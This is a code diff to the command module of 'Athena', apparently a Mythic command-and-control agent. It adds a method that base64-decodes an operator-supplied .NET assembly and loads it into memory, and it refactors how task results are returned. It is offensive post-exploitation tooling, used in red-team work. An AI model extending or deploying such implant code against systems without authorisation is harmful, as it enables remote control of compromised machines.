@@ -44,8 +44,36 @@ namespace Athena.Commands
                 return e.Message;
             }
         }
-        public async Task<object> ExecuteAssembly(MythicJob job) //How do I deal with this now?
+        public async Task<ResponseResult> LoadAssemblyAsync(MythicJob job)
         {
+            //This will load an assembly into our Assembly Load Context for usage with.
+            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
+            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
+            try
+            {
+                this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assembly)));
+                //Return true if success
+                return new ResponseResult
+                {
+                    task_id = job.task.id,
+                    user_output = "Successfully loaded assembly",
+                    completed = "true"
+                };
+            }
+            catch (Exception e)
+            {
+                return new ResponseResult
+                {
+                    task_id = job.task.id,
+                    user_output = e.Message,
+                    completed = "true",
+                    status = "error"
+                };
+            }
+        }
+        public async Task<ResponseResult> ExecuteAssembly(MythicJob job) //How do I deal with this now?
+        {
+            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
             if (assemblyIsRunning)
             {
                 return new ResponseResult()
@@ -114,7 +142,7 @@ namespace Athena.Commands
 
             return this.executeAssemblyWriter.GetStringBuilder().ToString();
         }
-        public async Task<object> ClearAssemblyLoadContext(string task_id)
+        public async Task<ResponseResult> ClearAssemblyLoadContext(MythicJob job)
         {
             //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
             //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
@@ -124,14 +152,20 @@ namespace Athena.Commands
                 this.executeAssemblyContext = new ExecuteAssemblyContext();
                 return new ResponseResult
                 {
-                    task_id = task_id,
+                    task_id = job.task.id,
                     completed = "true",
                     user_output = "AssemblyLoadContext reset."
                 };
             }
             catch (Exception e)
             {
-                return "Failed to clear AssemblyLoadContext!" + Environment.NewLine + e.Message;
+                return new ResponseResult
+                {
+                    task_id = job.task.id,
+                    completed = "true",
+                    user_output = e.Message,
+                    status = "error"
+                };
             }
         }
         public async Task<LoadCommandResponseResult> LoadCommandAsync(MythicJob job)
@@ -191,38 +225,9 @@ namespace Athena.Commands
                 };
             }
         }
-
         public async Task<bool> CommandIsLoaded(string command)
         {
             return this.loadedCommands.ContainsKey(command);
         }
-    }
-
-    public class ConsoleWriterEventArgs : EventArgs
-    {
-        public string Value { get; private set; }
-        public ConsoleWriterEventArgs(string value)
-        {
-            Value = value;
-        }
-    }
-    public class ConsoleWriter : TextWriter
-    {
-        public override Encoding Encoding { get { return Encoding.UTF8; } }
-
-        public override void Write(string value)
-        {
-            if (WriteEvent is not null) WriteEvent(this, new ConsoleWriterEventArgs(value));
-            base.Write(value);
-        }
-
-        public override void WriteLine(string value)
-        {
-            if (WriteLineEvent is not null) WriteLineEvent(this, new ConsoleWriterEventArgs(value));
-            base.WriteLine(value);
-        }
-
-        public event EventHandler<ConsoleWriterEventArgs> WriteEvent;
-        public event EventHandler<ConsoleWriterEventArgs> WriteLineEvent;
     }
 }
